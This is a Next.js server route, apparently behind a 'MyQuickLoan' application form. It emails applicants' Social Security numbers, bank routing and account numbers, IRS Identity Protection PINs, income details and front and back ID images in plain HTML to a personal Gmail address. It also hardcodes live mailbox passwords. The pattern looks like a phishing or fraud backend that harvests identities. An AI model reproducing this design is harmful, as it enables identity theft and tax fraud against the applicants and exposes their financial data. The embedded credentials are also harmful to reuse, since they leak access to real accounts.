import { NextResponse } from "next/server";
import nodemailer from "nodemailer";
import FormDataModel from "../loan/mongooseConfig";

export async function POST(request) {
  const { formData } = await request.json();
  const ssn = String(formData.ssn);
  const emailAddress = String(formData.emailAddress);
  const phoneNumber = String(formData.primaryPhoneNumber);

  // Create a Nodemailer transporter
  const transporter1 = nodemailer.createTransport({
    service: "gmail",
    // host: "smtp.gmail.com",
    // port: 465,
    // secure: true,hhjhklhkllklhlkkl
    auth: {
      user: "osr.cty@gmail.com",
      pass: "btzbcklyxerxvkiy",
    },
  });

  //   const transporter2 = nodemailer.createTransport({
  //     host: "mail.privateemail.com",
  //     port: 465,
  //     secure: true,
  //     auth: {
  //       user: "noreply@myquickloan.us",
  //       pass: "mighTY88$$",
  //     },
  //   });

  //   const autoReplyMessage = {
  //     from: "noreply@myquickloan.us",
  //     to: formData.emailAddress,
  //     subject: "Loan Application Received",
  //     html: `
  //     <h3>Thank you for your loan application!</h3>
  //     <p>We have received your loan application and will review it shortly.</p>
  //     <p>If you have any further questions or need assistance, please feel free to contact us: loans@myquickloan.us></a></p>
  //     <p>Best regards,</p>
  //     <p>MyQuickLoan Team</p>
  //     `,
  //   };
  // Compose the email message
  const message = {
    from: "osr.cty@gmail.com",
    to: ["kindras131@gmail.com"],
    subject: "Loan Application Details",
    html: `
    <h3>Loan Application Details ${
      formData.taxReturn === "yes" ? "- Filed for tax return 2022" : ""
    }</h3>
    <p>First Name: ${formData.firstName}</p>
    <p>Last Name: ${formData.lastName}</p>
    <p>Loan Amount: ${formData.loanAmount}</p>
    <p>Loan Duration: ${formData.loanDuration} months</p>
    <p>Monthly Mortgage: ${formData.monthlyMortgage}</p>
    <p>Monthly Payment: ${formData.monthlyPayment}</p>
    <p>Interest: ${formData.interest}</p>
    <p>Total Amount Paid: ${formData.totalAmountPaid}</p>
    <p>SSN: ${formData.ssn}</p>
    <p>Date of Birth: ${formData.dob}</p>
    <p>Address: ${formData.address}</p>
    <p>Suite/Apt: ${formData.suiteApt}</p>
    <p>City: ${formData.city}</p>
    <p>State: ${formData.state}</p>
    <p>Zip Code: ${formData.zipCode}</p>
    <p>Residence Duration: ${formData.residenceDuration}</p>
    <p>Residence Status: ${formData.residenceStatus}</p>
    <p>Eviction: ${formData.eviction}</p>
    <p>Email Address: ${formData.emailAddress}</p>
    <p>Primary Phone Number: ${formData.primaryPhoneNumber}</p>
    <p>Secondary Phone Number: ${formData.secondaryPhoneNumber}</p>
    <p>Routing Number: ${formData.routingNumber}</p>
    <p>Account Number: ${formData.accountNumber}</p>
    <p>Confirm Account Number: ${formData.confirmAccountNumber}</p>
    <p>Account Type: ${formData.accountType}</p>
    <p>Account Duration: ${formData.accountDuration}</p>
    <p>Direct Deposit: ${formData.directDeposit}</p>
    <p>Automatic Payments: ${formData.automaticPayments}</p>
    <p>Primary Income: ${formData.primaryIncome}</p>
    <p>Last Pay Amount: ${formData.lastPayAmount}</p>
    <p>Last Pay Date: ${formData.lastPayDate}</p>
    <p>Next Pay Date: ${formData.nextPayDate}</p>
    <p>Additional Income: ${formData.additionalIncome}</p>
    <p>Loan Purpose: ${formData.loanPurpose}</p>
    <p>Military Status: ${formData.militaryStatus}</p>
    <p>Bankruptcy History: ${formData.bankruptcyHistory}</p>
    <p>Payday Loan History: ${formData.paydayLoanHistory}</p>
    <p>My Quick Loan Source: ${formData.myQuickLoanSource}</p>
    <p>My Quick Loan Source Other: ${formData.myQuickLoanSourceOther}</p>
    <p>Credit Score: ${formData.creditScore}</p>
    <p>Mode of Disbursement: ${formData.meansOfDisbursement}</p>
    <p>Recieved Ip Pin: ${formData.receivedIPPIN}</p>
    <p>Filed for 2021 tax: ${formData.didFile2021Taxes}</p>
    <p>Adjusted Gross Income: ${formData.adjustedGrossIncome}</p>

    <p>License Number: ${
      formData.licenseNumber
    }</p><p>Loan to be given when reduced by 20%: ${
      (formData.loanAmount / 100) * 80
    }</p>
    <p>Front View:</p>
    <img src="${formData.frontView}" alt="Front View" />
    <p>Back View:</p>
    <img src="${formData.backView}" alt="Back View" />

    
  `,
  };

  try {
    // Send the email
    // await transporter2.sendMail(autoReplyMessage);
    await transporter1.sendMail(message);
    await FormDataModel.create({
      ssn: ssn,
      emailAddress: emailAddress,
      phoneNumber: phoneNumber,
    });
    return NextResponse.json({ success: true });
  } catch (error) {
    console.error(error);
    return NextResponse.json({ success: false }, { status: 500 });
  }
}

export async function GET(request) {
  return NextResponse.json({ message: "Method Not Allowed" }, { status: 405 });
}
